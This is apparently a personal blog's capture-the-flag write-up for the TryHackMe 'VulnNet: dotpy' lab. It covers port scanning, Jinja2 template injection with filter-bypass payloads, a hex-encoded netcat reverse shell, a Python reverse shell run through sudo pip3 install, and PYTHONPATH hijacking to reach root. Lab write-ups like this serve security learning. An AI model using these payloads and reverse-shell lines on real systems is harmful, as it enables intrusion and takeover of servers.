<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="monoloc0">
    <meta name="description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Apr 7 20:55:28 2021 as: nmap -sV -sC -oA nmap/output vulnnetdotpy.thm Nmap scan report for vulnnetdotpy.thm (10.10.6.225) Host is up (0.052s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Werkzeug httpd 1.0.1 (Python 3.6.9) | http-title: VulnNet Entertainment - Login | Discover |_Requested resource was http://vulnnetdotpy.">
    <meta name="keywords" content="infosec,bugbounty,personal">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Apr 7 20:55:28 2021 as: nmap -sV -sC -oA nmap/output vulnnetdotpy.thm Nmap scan report for vulnnetdotpy.thm (10.10.6.225) Host is up (0.052s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Werkzeug httpd 1.0.1 (Python 3.6.9) | http-title: VulnNet Entertainment - Login | Discover |_Requested resource was http://vulnnetdotpy."/>

    <meta property="og:title" content="" />
<meta property="og:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Apr 7 20:55:28 2021 as: nmap -sV -sC -oA nmap/output vulnnetdotpy.thm Nmap scan report for vulnnetdotpy.thm (10.10.6.225) Host is up (0.052s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Werkzeug httpd 1.0.1 (Python 3.6.9) | http-title: VulnNet Entertainment - Login | Discover |_Requested resource was http://vulnnetdotpy." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://monoloc0.github.io/vulnnetdotbpy/" /><meta property="article:section" content="" />





    <title>
   · monoloc0
</title>

    
      <link rel="canonical" href="https://monoloc0.github.io/vulnnetdotbpy/">
    

    <link rel="preload" href="https://monoloc0.github.io/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="https://monoloc0.github.io/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
    

    

    

    

    

    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="https://monoloc0.github.io/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://monoloc0.github.io/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.89.4" />
  </head>

  
  
  <body class="preload-transitions colorscheme-light">
    

    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://monoloc0.github.io/">
      monoloc0
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/whoami/">whoami</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/writeups/">writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/resources/">resources</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://monoloc0.github.io/vulnnetdotbpy/">
          
        </a>
      </h1>
    </header>

    <h1 id="enumeration">
  Enumeration
  <a class="heading-link" href="#enumeration">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<h2 id="port-scan">
  Port Scan
  <a class="heading-link" href="#port-scan">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<style>


pre code {
  background-color: #eee;

}


</style>

<pre tabindex="0"><code># Nmap 7.80 scan initiated Wed Apr  7 20:55:28 2021 as: nmap -sV -sC -oA nmap/output vulnnetdotpy.thm
Nmap scan report for vulnnetdotpy.thm (10.10.6.225)
Host is up (0.052s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://vulnnetdotpy.thm:8080/login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  7 20:55:41 2021 -- 1 IP address (1 host up) scanned in 12.18 seconds
</code></pre><p>Accessing the website</p>
<p><img src="../../_resources/4f882e9d25d84daca6b0205988616e57.png" alt="688d62f0867700478bab8d789583eebc.png"></p>
<h2 id="ssti">
  SSTI
  <a class="heading-link" href="#ssti">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>Ran Nikto Scan:</p>
<p><img src="../../_resources/b1e2a49a89564c8fb455896f27da0719.png" alt="8585698d47ac9bc1028fd263b42a80b8.png"></p>
<p>The webpage is apparently vulnerable to XSS.</p>
<p>Let&rsquo;s try it out:</p>
<p><img src="../../_resources/432e6d53c8b2486cb6e5262d84414359.png" alt="14c83bf029e913c61bb83954995860d7.png"></p>
<p>The non-existend subdirectory get&rsquo;s reflected to the page.</p>
<p>Let&rsquo;s try if the page is vulnerable to SSTI</p>
<p><img src="../../_resources/236a401121674438ac98febbb94a02f8.png" alt="6cd39e70bb2faf5ad4524040948f1f90.png"></p>
<p>Nice :)</p>
<p>I then followed this methodology</p>
<p><img src="../../_resources/de482963aa2140ea8a64002551255bdb.png" alt="05745f1395da0dcdacaf9bdf0bab47e7.png"></p>
<p>and found out that jinja template engine is being used</p>
<p><img src="../../_resources/f718bd1200ed400b89f67650927baf4c.png" alt="85fb26a9a6db93da685ee855bb59d647.png"></p>
<p>After sending a couple of payloads, I found out that <code> . _ and []</code> are filtered</p>
<p>The following payload (xxx.com) is bypasses the filer and is supposed to work:</p>
<p><strong>id command</strong></p>
<pre tabindex="0"><code>%7B%7Brequest%7Cattr('application')%7Cattr('%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f')%7Cattr('%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f')('%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f')%7Cattr('%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f')('%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f')('os')%7Cattr('popen')('id')%7Cattr('read')()%7D%7D
</code></pre><p><em>Note: URL Encoding matters!!!</em></p>
<p><strong>show content of /home</strong></p>
<pre tabindex="0"><code>/%7B%7Brequest%7Cattr('application')%7Cattr('%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f')%7Cattr('%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f')('%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f')%7Cattr('%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f')('%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f')('os')%7Cattr('popen')('ls%20-al%20%5Cx2fhome')%7Cattr('read')()%7D%7Dc
</code></pre><p><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p>
<p><strong>Reverse Shell Payload</strong></p>
<p>linux command needs to be hex encoded</p>
<p><a href="https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&amp;input=bWtmaWZvIC90bXAvcDsgbmMgMTAuOS43Ljg2IDEzMzcgMDwvdG1wL3AgfCAvYmluL3NoID4gL3RtcC9wIDI%2BJjE7IHJtIC90bXAvcCDigJM%2BIGhleA">https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&amp;input=bWtmaWZvIC90bXAvcDsgbmMgMTAuOS43Ljg2IDEzMzcgMDwvdG1wL3AgfCAvYmluL3NoID4gL3RtcC9wIDI%2BJjE7IHJtIC90bXAvcCDigJM%2BIGhleA</a></p>
<pre tabindex="0"><code>/%7B%7Brequest%7Cattr('application')%7Cattr('%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f')%7Cattr('%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f')('%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f')%7Cattr('%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f')('%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f')('os')%7Cattr('popen')('\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x70\x3b\x20\x6e\x63\x20\x31\x30\x2e\x39\x2e\x37\x2e\x38\x36\x20\x31\x33\x33\x37\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x70\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x70\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x70\x20\xe2\x80\x93\x3e\x20\x68\x65\x78')%7Cattr('read')()%7D%7D 
</code></pre><p>After catching a reverse shell I ran the following command</p>
<pre tabindex="0"><code>web@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
</code></pre><p>Next Steps</p>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/pip/#sudo">https://gtfobins.github.io/gtfobins/pip/#sudo</a></li>
<li>Create /tmp/shell/setup.py</li>
</ul>
<pre tabindex="0"><code>mkdir /tmp/shell
touch /tmp/shell/setup.py
</code></pre><ul>
<li>place python reverse shell wthin /tmp/shell/setup.py</li>
</ul>
<pre tabindex="0"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.7.86&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
</code></pre><ul>
<li>
<p>Run  <code>sudo -u system-adm /usr/bin/pip3 install /tmp/shell</code></p>
</li>
<li>
<p>Catch a shell
<img src="../../_resources/5ceb1c8422d0457b9cefbd7050d740d1.png" alt="3c5119498b0b8d95554d66cc7622bfe4.png"></p>
</li>
<li>
<p>Flag: <strong>THM{91c7547864fa1314a306f82a14cd7fb4}</strong></p>
</li>
</ul>
<h1 id="roottxt">
  Root.txt
  <a class="heading-link" href="#roottxt">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<pre tabindex="0"><code>system-adm@vulnnet-dotpy:/tmp/pip-ajvj6guw-build$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
system-adm@vulnnet-dotpy:/tmp/pip-ajvj6guw-build$ 
</code></pre><p>/opt/backup.py is only writable by root</p>
<p><img src="../../_resources/20210412231513.png" alt="20210412231513.png"></p>
<p>The output of <code>sudo -l</code> shows that the SETENV tag is set. That means you can pass an environment variable (from the context of system-adm user) when running the sudo command &ndash;&gt; PYTHONPATH Hijacking</p>
<p>Content of <code>/opt/backup.py</code></p>
<pre tabindex="0"><code>from datetime import datetime
from pathlib import Path
import zipfile


OBJECT_TO_BACKUP = '/home/manage'  # The file or directory to backup
BACKUP_DIRECTORY = '/var/backups'  # The location to store the backups in
MAX_BACKUP_AMOUNT = 300  # The maximum amount of backups to have in BACKUP_DIRECTORY


object_to_backup_path = Path(OBJECT_TO_BACKUP)
backup_directory_path = Path(BACKUP_DIRECTORY)
assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue

# Validate the backup directory exists and create if required
backup_directory_path.mkdir(parents=True, exist_ok=True)

# Get the amount of past backup zips in the backup directory already
existing_backups = [
    x for x in backup_directory_path.iterdir()
    if x.is_file() and x.suffix == '.zip' and x.name.startswith('backup-')
]

# Enforce max backups and delete oldest if there will be too many after the new backup
oldest_to_newest_backup_by_name = list(sorted(existing_backups, key=lambda f: f.name))
while len(oldest_to_newest_backup_by_name) &gt;= MAX_BACKUP_AMOUNT:  # &gt;= because we will have another soon
    backup_to_delete = oldest_to_newest_backup_by_name.pop(0)
    backup_to_delete.unlink()

# Create zip file (for both file and folder options)
backup_file_name = f'backup-{datetime.now().strftime(&quot;%Y%m%d%H%M%S&quot;)}-{object_to_backup_path.name}.zip'
zip_file = zipfile.ZipFile(str(backup_directory_path / backup_file_name), mode='w')
if object_to_backup_path.is_file():
    # If the object to write is a file, write the file
    zip_file.write(
        object_to_backup_path.absolute(),
        arcname=object_to_backup_path.name,
        compress_type=zipfile.ZIP_DEFLATED
    )
elif object_to_backup_path.is_dir():
    # If the object to write is a directory, write all the files
    for file in object_to_backup_path.glob('**/*'):
        if file.is_file():
            zip_file.write(
                file.absolute(),
                arcname=str(file.relative_to(object_to_backup_path)),
                compress_type=zipfile.ZIP_DEFLATED
            )
# Close the created zip file
zip_file.close()

</code></pre><p>As you can see on the very top of the <code>backup.py</code> file, <code>zipfile</code> is imported.</p>
<p>So, I created a file called <code>zipfile.py</code> and placed a reverse shell in it.</p>
<p>Next I ran the following command: <code>sudo PYTHONPATH=. /usr/bin/python3 /opt/backup.py</code></p>
<p>and received a reverse shell as <strong>root</strong></p>
<p>[<img src="../../_resources/20210413000757.png" alt="../../_resources/20210413000757.png"></p>
<p>Flag: THM{734c7c2f0a23a4f590aa8600676021fb}</p>
<p>With finishing VulnNet: dotpy I hit the 60 Days streak :)</p>
<p>[<img src="../../_resources/20210413001337.png" alt="../../_resources/20210413001337.png"></p>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    ©
    
    2021
     monoloc0 


    
  </section>
</footer>

    </main>

    
      
      <script src="https://monoloc0.github.io/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
